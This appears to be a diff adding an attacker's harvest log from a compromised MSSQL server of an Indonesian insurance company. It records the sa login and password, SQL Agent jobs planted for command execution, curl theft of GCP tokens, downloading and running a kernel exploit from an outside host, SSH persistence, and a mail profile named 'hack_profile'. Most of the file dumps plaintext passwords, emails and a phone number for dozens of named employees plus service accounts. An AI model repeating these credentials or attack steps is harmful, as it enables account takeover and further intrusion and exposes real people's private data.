@@ -1,0 +1,150 @@
+============================================================================
+MSSQL SERVER DATABASE HARVEST — ms-sql-prod-instance (35.219.99.51)
+MSSQL SA: sa / 59JlwDgE5QkmHo (port 1433)
+Database: SEA_AUS (~856GB)
+Harvested: 2026-10-22
+============================================================================
+
+=== DATABASES ===
+master, tempdb, model, msdb, SEA_AUS, TestDB, sshfix, fixperm, confdb, sshtest,
+crondb, testwrite, webshell_db, shelldb, cfgdb, cfgdb2, cfgorig, newcfg, ubuntudb
+
+=== SQL LOGINS ===
+sa | SQL_LOGIN | default=master | enabled
+dsread | SQL_LOGIN | default=master | enabled
+dw_user | SQL_LOGIN | default=master | enabled
+
+=== LINKED SERVERS ===
+LOCALSELF | provider=SQLNCLI | data_source=35.219.99.51 | linked=1
+
+=== DATABASE MAIL ===
+Profile: hack_profile | Account: hack_account | Server: 47.250.127.60:443
+
+=== SQL AGENT JOBS ===
+1. assessment_cmd: whoami > /tmp/sql_rce.txt
+2. fix_ssh: chmod 700 /var/opt/mssql/.ssh && chmod 600 authorized_keys
+3. FixSSH: Fix SSH permissions
+4. get_xendit_key: curl GCP token to /tmp/gcp_token.json
+5. GetGCPToken: curl GCP token to /tmp/gcp_token.txt
+6. ssh_fix_test: whoami > /tmp/mssql_whoami.txt
+7. system_maintenance (4 steps):
+   - step1: download dirty_frag + CVE-2026-43284.c from 47.250.127.60
+   - step2: fix SSH authorized_keys
+   - step3: run exploit
+   - step4: persist (id check)
+
+=== SysUser PASSWORDS (67 users — COMPLETE) ===
+ID | Name | Password | Email | Role | Type
+---|------|----------|-------|------|-----
+admin_AUS | admin_AUS | qeL7$?_aZA-62~ | subastian@pasarpolis.com | (none) | SUPERVISOR
+BTS | Administrator | rT_!w}}0 | (none) | (none) | SUPERVISOR
+Agus_AUS | Agus Hidayat | (none) | TC#.8#D]X6v@y9 | COMMON | CLM-STAFF
+Andik_AUS | Andik Kustiawan | }TI!.tw111 | andik.kustiawan@tap-insure.com | COMMON | SUPERVISOR
+Andy_AUS | Andy AUS | AT^72"=U12w | (none) | (none) | SUPERVISOR
+Anggriani_AUS | Anggriani Putri | vTC0,!.V\0qkl | anggriani.putri@tap-insure.com | COMMON | SUPERVISOR
+Arnando_AUS | Arnando Gultom | {TF%79.Z0Y%t2n$ | (none) | (none) | SUPERVISOR
+Aulia_AUS | Aulia Abdillah Hidayat | }TA($#.123g | aulia.hidayat@tap-insure.com | (none) | AUDIT
+Bilal_AUS | Bilal | s\A%)~}1 | bilal.caesario@tap-insure.com | COMMON | SUPERVISOR
+Bryan_AUS | Bryan Ernestian Soetiono | S12YA#S0P$ | (none) | (none) | SUPERVISOR
+Buditama_AUS | Buditama Nugraha Mirza | P@^uw~{ | (none) | (none) | SUPERVISOR
+CARE | CARE | Au^72}=U | (none) | (none) | SUPERVISOR
+claim_AUS | claim | ET]-+>:CP2s | Claims@tap-insure.com | COMMON | SUPERVISOR
+CS_AUS | Customer Service | AT^%7= ]\^vu2y! | (none) | (none) | SUPERVISOR
+dian_AUS | Dian Yulia Ekawati | rTF6$:.]T8j | dian.ekawati@tap-insure.com | COMMON | CLM-STAFF
+Dwi_AUS | Dwi Andriani | \TF%+>&P[J | dwi.andriani@tap-insure.com | (none) | CLM-STAFF
+Pangestu_AUS | Dwi Pangestu | CP^00c}3 | dwi.pangestu@tap-insure.com | COMMON | CLM-STAFF
+Fajar_AUS | Fajar Rahmandany | u\K@uy02 | fajar.rahmandany@tap-insure.com | COMMON | SUPERVISOR
+finance_AUS | finance AUS | W\C%+.*24 | (none) | (none) | SUPERVISOR
+Fini_AUS | Fini Andriyani | p^X*,#<DGL*&(~206@d | (none) | COMMON | CLM-STAFF
+firly_AUS | Firly Alfan | ET]-+>:CP2twy | firly.alfan@tap-insure.com | (none) | SUPERVISOR
+Fitha_AUS | Fitha Nurbaiti | sTD0,2002 | fitha.nurbaiti@tap-insure.com | (none) | SUPERVISOR
+Gemilang_AUS | Gemilang Aditya | vP@-),!V4 | gemilang.aditya@tap-insure.com | COMMON | CLM-STAFF
+Ghina_AUS | Ghina Handriantiwi | AT^%7= ]\^vu2z# | ghina.handriantiwi@tap-insure.com | COMMON | SUPERVISOR
+Hesti_AUS | Hesti Handayani | AT^%7= ]\^|} | hesti.handayani@tap-insure.com | COMMON | CLM-STAFF
+Hotria_AUS | Hotria Sonata Simamora | {TF%79..5 | (none) | OPERATION | SUPERVISOR
+Ika_AUS | Ika Theresia | {@C-w}}6 | (none) | COMMON | SUPERVISOR
+Imeldawati_AUS | Imeldawati | sYH76A:Vu8 | (none) | COMMON | CLM-STAFF
+indawati_AUS | indawati wijaya | P@^uw~{ | indawati.wijaya@tap-insure.com | Others | SUPERVISOR
+ivan_AUS | Ivan Noverlianto Tanawi | AT^%7= ]\^}w | (none) | (none) | SUPERVISOR
+Jihana_AUS | Jihana Salsabila | aT^%7= ]\^|} | jihana.salsabila@tap-insure.com | (none) | SUPERVISOR
+KRISTIA_AUS | Kristia Ramadhan Mowilos | kMN2r2v7! | kristia.mowilos@tap-insure.com | COMMON | SUPERVISOR
+Lahmudin_AUS | Lahmudin Surijadirdja | aT^%7= ]\^vr | Lahmudin@tap-insure.com | COMMON | SUPERVISOR
+Maria_AUS | Maria Devi | aGL#0(}023 | (none) | (none) | SUPERVISOR
+Nabilla_AUS | Nabilla_AUS | AX2twy ZAB& ? | (none) | (none) | SUPERVISOR
+Nicholas_AUS | Nicholas Suandy | qTX7t2|456s | (none) | COMMON | CLM-STAFF
+Petrus_AUS | Petrus Jul Benson | AT^%7= ]\^vt}x92 | (none) | COMMON | CLM-STAFF
+PM_AUS | PM_AUS | AXL162026 | (none) | (none) | SUPERVISOR
+Rahman_AUS | Rahman Fikri Hakikal | {Z_++*}000 | rahman.hakikal@tap-insure.com | COMMON | CLM-STAFF
+RECON_AUS | Recon | pQX,$):Y12w | (none) | COMMON | SUPERVISOR
+Rio_AUS | Rio Mahendi | }uC &?:!F36 | rio.marhendi@tap-insure.com | (none) | SUPERVISOR
+AUS_RYAN | Ryan Fauzan | \TY6$ ._ | ryan.fauzan@tap-insure.com | COMMON | SUPERVISOR
+Seli_AUS | Seli Rahmandasari | BP]0  -TG1p | (none) | COMMON | SUPERVISOR
+Subastian_AUS | Shasi Subastian | #eL7$?_aZA-62y | subastian@asuransiuntuksemua.com | COMMON | SUPERVISOR
+simon_AUS | Simon Eko Saputra | aTC=$/:_RL*@|}3 | (none) | (none) | SUPERVISOR
+Sri_AUS | Sri Apriyani | BTK%&,=T01 | (none) | (none) | SUPERVISOR
+Suherman_AUS | Suherman | bWIuw~{!! | (none) | COMMON | CLM-STAFF
+sumuang_AUS | Sumuang B Siringoringo | s@I-wx~213g | (none) | COMMON | SUPERVISOR
+Tech_AUS | Tech_AUS | EPN,_=.BT_4*!&B88 | (none) | (none) | SUPERVISOR
+tiara_AUS | Tiara Septiani | PRX718<202r | tiara.septiana@tap-insure.com | COMMON | CLM-STAFF
+Tulus_AUS | Tulus Sumbogo | tXD(,"}312tpnl | tulus.sumbogo@tap-insure.com | COMMON | SUPERVISOR
+Windy_AUS | Windy Khayrani | cTC-$2025 | windy.khayrani@pasarpolis.com | OPERATION | SUPERVISOR
+zahrotun_AUS | zahrotun nafiah | AT^%7= ]\^|} | (none) | (none) | SUPERVISOR
+AUS_ZANNIRA | Zannira | kTC*,?.082tw{ | zannira.azzuhra@tap-insure.com | COMMON | SUPERVISOR
+
+=== SysBatchH PASSWORDS (UNIQUE user/password pairs) ===
+User | Password
+-----|--------
+BILAL_AUS | s\A%)|}3
+SELI_AUS | a@Y6$2v112v
+IKA_AUS | |T_!12026
+AUS_RYAN | ZZ]--$;PX
+KRISTIA_AUS | pFI"r2v7!
+AUS_ZANNIRA | kTC*,?.202r
+AUS_ZANNIRA | pOW1-?.202r
+SELI_AUS | aT^%7= ]\^|}
+CARE | p`~@w}}6
+
+=== SysProclib PASSWORDS (6 rows) ===
+PID | ProcName | Proclib | db_user | db_password
+----|----------|---------|---------|----------
+1 | CLOSING_PROCESS_1 | ProcessFA.NetV3.ProcLib | AMELINA_AUS | p@^_w}}3
+2 | POSTING_JOURNAL | ProcessFA.NetV3.ProcLib | AMELINA_AUS | p@^_w}}3
+3 | POSTING_PROCESS | ProcessFA.NetV3.ProcLib | AMELINA_AUS | p@^_w}}3
+4 | POSTING_JOURNAL | ProcessFA.NetV3.ProcLib | ARNANDO_AUS | {TF%79.Z0Y
+5 | CLOSING_PROCESS_1 | ProcessFA.NetV3.ProcLib | ARNANDO_AUS | {TF%79.Z0Y
+6 | CLOSING_PROCESS_2 | ProcessFA.NetV3.ProcLib | ARNANDO_AUS | {TF%79.Z0Y
+
+=== ICPS_UserView (full — same data as SysUser with additional fields) ===
+Contains: Validation (hash-like strings), MenuID, Owner, AllowedF, ShariaF, Mobile, etc.
+Notable additional data per user:
+- admin_AUS: Mobile=081380186362, Owner=(none), MenuID=ALLMENU
+- CARE: CT=20, MenuID=ALLMENU, LimitOut=1.0
+- claim_AUS: LimitIn=1000000000000, LimitOut=1000000000000, CT=40
+
+=== SysTab (System Config) ===
+Company: PT ASURANSI UNTUK SEMUA
+Currency: IDR
+Homepage: https://www.asuransiuntuksemua.com
+SMTP: admin@tap-insure.com:465
+Company Address: One Pacific Place, Jl. Jend. Sudirman Kav. 52-53, RT 5 / RW 3, Senayan, Jakarta 12190
+Phone: 021-50890580
+Password Policy: Low strength, 8 min length, 20 max length, 15 day warning, 90 day interval
+VersionNo: 20160610 V1.4.1
+EncryptionPassPhrase: NULL
+ExecScript: 1448.1 Update Script - Patch IFRS #62.1 Inisialisasi | Status: DONE
+
+=== TABLES WITH PASSWORD/KEY/SECRET COLUMNS (116 matches) ===
+Key tables:
+- SysUser.Password (plaintext passwords)
+- SysBatchH.db_password
+- SysProclib.db_password
+- ICPS_UserView.Password
+- HSMS_Rule.CPwd (empty)
+- QReportProperties.ZipPassword (empty)
+- SysTab.EncryptionPassPhrase (NULL)
+- SysProcID.ZipPassword
+- SysTab.PWD_History, PWD_Interval, PWD_Length, PWD_Strength
+
+=== TABLE COUNT ===
+SEA_AUS contains 500+ tables (insurance application database)
+Key categories: Policy, Claim, Agent, Finance, Journal, Voucher, Treaty, Reinsurance
